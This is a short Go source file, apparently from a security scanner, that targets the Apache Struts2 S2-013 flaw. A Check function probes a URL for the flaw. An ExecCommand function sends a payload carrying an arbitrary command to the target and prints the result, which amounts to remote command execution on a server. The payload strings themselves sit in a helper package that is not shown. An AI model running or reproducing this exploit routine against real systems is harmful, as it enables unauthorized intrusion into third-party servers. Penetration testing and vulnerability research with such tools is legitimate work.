package s2_013

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
    "strings"
)

func Check(targetUrl string) {
    respString := utils.GetFunc4Struts2(targetUrl, "", utils.POC_s013_check)
    if utils.IfContainsStr(respString, "6308") {
        color.Red("*Found Struts2-013！")
    } else {
        fmt.Println("Struts2-013 Not Vulnerable.")
    }
}
func ExecCommand(targetUrl string, command string) {
    respString := utils.GetFunc4Struts2(targetUrl, "", utils.POC_s013_exec(command))
    respString = strings.Replace(url.QueryEscape(respString), "%00", "", -1)
    fmt.Println(url.QueryUnescape(respString))
}
